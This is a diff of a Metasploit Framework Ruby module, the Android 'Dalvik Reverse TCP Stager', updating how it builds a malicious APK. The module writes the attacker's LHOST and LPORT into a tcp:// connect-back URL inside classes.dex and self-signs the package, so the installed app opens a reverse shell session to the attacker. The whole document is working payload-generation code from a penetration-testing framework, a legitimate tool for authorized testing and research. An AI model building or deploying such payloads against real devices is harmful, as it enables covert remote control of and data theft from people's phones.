@@ -1,84 +1,61 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#	http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'metasploit-payloads'
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
 
-	include Msf::Payload::Stager
-	include Msf::Payload::Dalvik
+  CachedSize = :dynamic
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'			=> 'Dalvik Reverse TCP Stager',
-			'Description'	=> 'Connect back stager',
-			'Author'		=> 'timwr',
-			'License'		=> MSF_LICENSE,
-			'Platform'		=> 'android',
-			'Arch'			=> ARCH_DALVIK,
-			'Handler'		=> Msf::Handler::ReverseTcp,
-			'Stager'		=> {'Payload' => ""}
-		))
-	end
+  include Msf::Payload::Stager
+  include Msf::Payload::Dalvik
 
-	def string_sub(data, placeholder, input)
-		data.gsub!(placeholder, input + ' ' * (placeholder.length - input.length))
-	end
+  def initialize(info = {})
+    super(merge_info(info,
+      'Name'        => 'Dalvik Reverse TCP Stager',
+      'Description' => 'Connect back stager',
+      'Author'      => ['timwr', 'OJ Reeves'],
+      'License'     => MSF_LICENSE,
+      'Platform'    => 'android',
+      'Arch'        => ARCH_DALVIK,
+      'Handler'     => Msf::Handler::ReverseTcp,
+      'Stager'      => {'Payload' => ''}
+    ))
+  end
 
-	def generate_jar(opts={})
-		jar = Rex::Zip::Jar.new
+  def include_send_uuid
+      false
+  end
 
-		classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
+  def generate_jar(opts={})
+    jar = Rex::Zip::Jar.new
 
-		string_sub(classes, '127.0.0.1                       ', datastore['LHOST'].to_s) if datastore['LHOST']
-		string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
-		jar.add_file("classes.dex", fix_dex_header(classes))
+    classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
 
-		files = [
-			[ "AndroidManifest.xml" ],
-			[ "res", "drawable-mdpi", "icon.png" ],
-			[ "res", "layout", "main.xml" ],
-			[ "resources.arsc" ]
-		]
+    url = "tcp://#{datastore['LHOST']}:#{datastore['LPORT']}"
+    string_sub(classes, 'ZZZZ' + ' ' * 512, 'ZZZZ' + url)
+    apply_options(classes)
 
-		jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
-		jar.build_manifest
+    jar.add_file("classes.dex", fix_dex_header(classes))
 
-		x509_name = OpenSSL::X509::Name.parse(
-			"C=Unknown/ST=Unknown/L=Unknown/O=Unknown/OU=Unknown/CN=Unknown"
-			)
-		key  = OpenSSL::PKey::RSA.new(1024)
-		cert = OpenSSL::X509::Certificate.new
-		cert.version = 2
-		cert.serial = 1
-		cert.subject = x509_name
-		cert.issuer = x509_name
-		cert.public_key = key.public_key
+    files = [
+      [ "AndroidManifest.xml" ],
+      [ "resources.arsc" ]
+    ]
 
-		# Some time within the last 3 years
-		cert.not_before = Time.now - rand(3600*24*365*3)
+    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
+    jar.build_manifest
 
-		# From http://developer.android.com/tools/publishing/app-signing.html
-		# """
-		# A validity period of more than 25 years is recommended.
-		#
-		# If you plan to publish your application(s) on Google Play, note
-		# that a validity period ending after 22 October 2033 is a
-		# requirement. You can not upload an application if it is signed
-		# with a key whose validity expires before that date.
-		# """
-		cert.not_after = cert.not_before + 3600*24*365*20 # 20 years
+    cert, key = generate_cert
+    jar.sign(key, cert, [cert])
 
-		jar.sign(key, cert, [cert])
-
-		jar
-	end
+    jar
+  end
 
 end
